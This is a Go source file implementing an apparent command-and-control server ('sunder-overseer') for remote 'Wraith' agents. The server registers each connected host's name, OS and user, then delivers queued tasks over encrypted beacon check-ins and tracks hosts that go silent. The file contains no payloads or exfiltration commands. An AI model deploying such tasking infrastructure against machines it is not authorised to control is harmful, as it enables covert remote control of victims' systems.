// SPDX-License-Identifier: AGPL-3.0-only
package whisper

import (
	"crypto/ecdh"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"net/http"
	"sort"
	"sync"
	"time"
)

const (
	ephTTL            = 60 * time.Second
	defaultCadenceSec = 5
)

const (
	stateBreathing = "breathing"
	stateSilent    = "silent"
	stateDark      = "dark"
)

// Shard is the public record of a connected Wraith
type Shard struct {
	ID         string    `json:"id"`
	SessionID  string    `json:"session_id"`
	Hostname   string    `json:"hostname"`
	OS         string    `json:"os"`
	Arch       string    `json:"arch"`
	User       string    `json:"user"`
	FirstSeen  time.Time `json:"first_seen"`
	LastBreath time.Time `json:"last_breath"`
	CadenceS   int       `json:"cadence_s"`
}

type shardEntry struct {
	shard Shard
	key   SessionKey
	state string
}

type ephSession struct {
	key     *ecdh.PrivateKey
	expires time.Time
}

// Server owns the handshake state, the task queues, and the shard registry
type Server struct {
	mu      sync.Mutex
	shards  map[string]*shardEntry
	pending map[string][]*Task
	done    map[string]TaskResult
	eph     map[string]ephSession
	onEvent func(string)
}

// SetEventHandler installs a sink for lifecycle narration; when nil the
// server falls back to the standard logger
func (s *Server) SetEventHandler(fn func(string)) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.onEvent = fn
}

func (s *Server) emit(msg string) {
	s.mu.Lock()
	fn := s.onEvent
	s.mu.Unlock()
	if fn != nil {
		fn(msg)
		return
	}
	log.Print(msg)
}

// ListShards returns the registry as a stable snapshot ordered by first seen
func (s *Server) ListShards() []Shard {
	s.mu.Lock()
	defer s.mu.Unlock()
	shards := make([]Shard, 0, len(s.shards))
	for _, entry := range s.shards {
		shards = append(shards, entry.shard)
	}
	sort.Slice(shards, func(i, j int) bool { return shards[i].FirstSeen.Before(shards[j].FirstSeen) })
	return shards
}

// ShardByID returns the registry record for one shard id
func (s *Server) ShardByID(id string) (Shard, bool) {
	s.mu.Lock()
	defer s.mu.Unlock()
	entry, ok := s.shards[id]
	if !ok {
		return Shard{}, false
	}
	return entry.shard, true
}

// QueueTask queues one Word for a Shard and returns its task id
func (s *Server) QueueTask(shardID, word string, args map[string]string) (string, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if _, ok := s.shards[shardID]; !ok {
		return "", errors.New("whisper: unknown shard")
	}
	task := &Task{ID: randomHex(8), Word: word, Args: args}
	s.pending[shardID] = append(s.pending[shardID], task)
	return task.ID, nil
}

// WaitTaskResult blocks until the Shard answers a task or the timeout passes
func (s *Server) WaitTaskResult(taskID string, timeout time.Duration) (TaskResult, error) {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		s.mu.Lock()
		res, ok := s.done[taskID]
		if ok {
			delete(s.done, taskID)
		}
		s.mu.Unlock()
		if ok {
			return res, nil
		}
		time.Sleep(200 * time.Millisecond)
	}
	return TaskResult{}, fmt.Errorf("whisper: task %s went unanswered for %s", taskID, timeout)
}

// Reap walks the presence ladder and narrates crossings into silence or the dark
func (s *Server) Reap() {
	now := time.Now()
	type crossing struct {
		id       string
		state    string
		lastTime time.Time
		cadence  int
	}
	s.mu.Lock()
	var crosses []crossing
	for id, e := range s.shards {
		cad := time.Duration(e.shard.CadenceS) * time.Second
		if cad <= 0 {
			cad = defaultCadenceSec * time.Second
		}
		age := now.Sub(e.shard.LastBreath)
		st := stateBreathing
		if age > 2*cad {
			st = stateSilent
		}
		if age > 5*cad {
			st = stateDark
		}
		if e.state == "" {
			e.state = st
		} else if stateRank(st) > stateRank(e.state) {
			e.state = st
			crosses = append(crosses, crossing{id: id, state: st, lastTime: e.shard.LastBreath, cadence: e.shard.CadenceS})
		}
	}
	s.mu.Unlock()
	for _, c := range crosses {
		switch c.state {
		case stateSilent:
			s.emit(fmt.Sprintf("[shard %s] has gone silent", c.id))
		case stateDark:
			age := now.Sub(c.lastTime)
			s.emit(fmt.Sprintf("[shard %s] goes dark: last breath %s ago (cadence %ds)", c.id, agoString(age), c.cadence))
		}
	}
}

func stateRank(state string) int {
	switch state {
	case stateSilent:
		return 1
	case stateDark:
		return 2
	default:
		return 0
	}
}

func agoString(d time.Duration) string {
	if d < time.Second {
		return "0s"
	}
	return d.Round(time.Second).String()
}

// NewServer creates an empty whisper server
func NewServer() *Server {
	return &Server{
		shards:  make(map[string]*shardEntry),
		pending: make(map[string][]*Task),
		done:    make(map[string]TaskResult),
		eph:     make(map[string]ephSession),
	}
}

// ServeHTTP routes the whisper v1 endpoints
func (s *Server) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	switch {
	case r.Method == http.MethodGet && r.URL.Path == "/whisper/v1":
		writeJSON(w, http.StatusOK, map[string]string{
			"service": "sunder-overseer",
			"whisper": "v1",
			"verse":   "a shard will come knocking",
		})
	case r.Method == http.MethodGet && r.URL.Path == "/whisper/v1/shards":
		s.handleShards(w, r)
	case r.Method == http.MethodGet && r.URL.Path == "/whisper/v1/handshake/start":
		s.handleStart(w, r)
	case r.Method == http.MethodPost && r.URL.Path == "/whisper/v1/handshake/complete":
		s.handleComplete(w, r)
	case r.Method == http.MethodPost && r.URL.Path == "/whisper/v1/beat":
		s.handleBeat(w, r)
	default:
		http.NotFound(w, r)
	}
}

func (s *Server) handleStart(w http.ResponseWriter, r *http.Request) {
	key, err := NewEphemeral()
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err)
		return
	}
	session := randomHex(8)
	s.mu.Lock()
	now := time.Now()
	for id, es := range s.eph {
		if now.After(es.expires) {
			delete(s.eph, id)
		}
	}
	s.eph[session] = ephSession{key: key, expires: now.Add(ephTTL)}
	s.mu.Unlock()
	writeJSON(w, http.StatusOK, StartResp{
		Session: session,
		EphPub:  PubHex(key.PublicKey()),
		TTLS:    int(ephTTL.Seconds()),
	})
}

func (s *Server) handleComplete(w http.ResponseWriter, r *http.Request) {
	var req CompleteReq
	if err := readJSON(r, &req); err != nil {
		writeErr(w, http.StatusBadRequest, err)
		return
	}
	s.mu.Lock()
	eph, ok := s.eph[req.Session]
	if ok && time.Now().After(eph.expires) {
		ok = false
	}
	delete(s.eph, req.Session)
	s.mu.Unlock()
	if !ok {
		writeErr(w, http.StatusUnauthorized, errors.New("whisper: stale or unknown handshake session"))
		return
	}
	key, err := DeriveSessionKey(eph.key, req.EphPub)
	if err != nil {
		writeErr(w, http.StatusBadRequest, err)
		return
	}
	plain, err := Open(key, Envelope{Nonce: req.Nonce, CT: req.CT})
	if err != nil {
		writeErr(w, http.StatusUnauthorized, errors.New("whisper: could not open client hello"))
		return
	}
	var hello Hello
	if err := json.Unmarshal(plain, &hello); err != nil {
		writeErr(w, http.StatusBadRequest, err)
		return
	}
	if hello.ID == "" {
		hello.ID = randomHex(8)
	}
	now := time.Now()
	s.mu.Lock()
	existing, known := s.shards[hello.ID]
	if known {
		// a known shard returns: keep first seen, refresh the session and identity
		sh := existing.shard
		sh.SessionID = req.Session
		sh.Hostname = hello.Hostname
		sh.OS = hello.OS
		sh.Arch = hello.Arch
		sh.User = hello.User
		sh.LastBreath = now
		sh.CadenceS = defaultCadenceSec
		s.shards[hello.ID] = &shardEntry{shard: sh, key: key, state: stateBreathing}
		s.mu.Unlock()
		s.emit(fmt.Sprintf("[shard %s] returns from the dark: %s/%s user=%s host=%s", hello.ID, hello.OS, hello.Arch, hello.User, hello.Hostname))
	} else {
		s.shards[hello.ID] = &shardEntry{
			shard: Shard{
				ID:         hello.ID,
				SessionID:  req.Session,
				Hostname:   hello.Hostname,
				OS:         hello.OS,
				Arch:       hello.Arch,
				User:       hello.User,
				FirstSeen:  now,
				LastBreath: now,
				CadenceS:   defaultCadenceSec,
			},
			key:   key,
			state: stateBreathing,
		}
		s.mu.Unlock()
		s.emit(fmt.Sprintf("[shard %s] registered: %s/%s user=%s host=%s", hello.ID, hello.OS, hello.Arch, hello.User, hello.Hostname))
	}
	ack := Ack{
		ShardID:   hello.ID,
		SessionID: req.Session,
		CadenceS:  defaultCadenceSec,
		Server:    "sunder-overseer",
		TS:        now.Unix(),
	}
	respEnv, err := Seal(key, mustJSON(ack))
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err)
		return
	}
	writeJSON(w, http.StatusOK, respEnv)
}

func (s *Server) handleBeat(w http.ResponseWriter, r *http.Request) {
	var req BeatPost
	if err := readJSON(r, &req); err != nil {
		writeErr(w, http.StatusBadRequest, err)
		return
	}
	s.mu.Lock()
	entry, ok := s.shards[req.ShardID]
	s.mu.Unlock()
	if !ok {
		writeErr(w, http.StatusNotFound, errors.New("whisper: unknown shard"))
		return
	}
	plain, err := Open(entry.key, req.Envelope)
	if err != nil {
		writeErr(w, http.StatusUnauthorized, errors.New("whisper: could not open beat"))
		return
	}
	var beat BeatReq
	if err := json.Unmarshal(plain, &beat); err != nil {
		writeErr(w, http.StatusBadRequest, err)
		return
	}
	now := time.Now()
	s.mu.Lock()
	entry.shard.LastBreath = now
	entry.state = stateBreathing
	if beat.Result != nil && beat.Result.TaskID != "" {
		s.done[beat.Result.TaskID] = *beat.Result
	}
	task := s.popTaskLocked(req.ShardID)
	s.mu.Unlock()
	ack := BeatAck{OK: true, TS: now.Unix(), Task: task}
	respEnv, err := Seal(entry.key, mustJSON(ack))
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err)
		return
	}
	writeJSON(w, http.StatusOK, respEnv)
}

// popTaskLocked takes the oldest queued Task for a shard; the caller holds the lock
func (s *Server) popTaskLocked(shardID string) *Task {
	q := s.pending[shardID]
	if len(q) == 0 {
		return nil
	}
	task := q[0]
	if len(q) == 1 {
		delete(s.pending, shardID)
	} else {
		s.pending[shardID] = q[1:]
	}
	return task
}

func (s *Server) handleShards(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, http.StatusOK, s.ListShards())
}

func randomHex(n int) string {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		panic(err)
	}
	return hex.EncodeToString(b)
}

func mustJSON(v any) []byte {
	b, err := json.Marshal(v)
	if err != nil {
		panic(err)
	}
	return b
}

func writeJSON(w http.ResponseWriter, code int, v any) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	_, _ = w.Write(mustJSON(v))
}

func writeErr(w http.ResponseWriter, code int, err error) {
	writeJSON(w, code, map[string]string{"error": err.Error()})
}

func readJSON(r *http.Request, v any) error {
	return json.NewDecoder(r.Body).Decode(v)
}
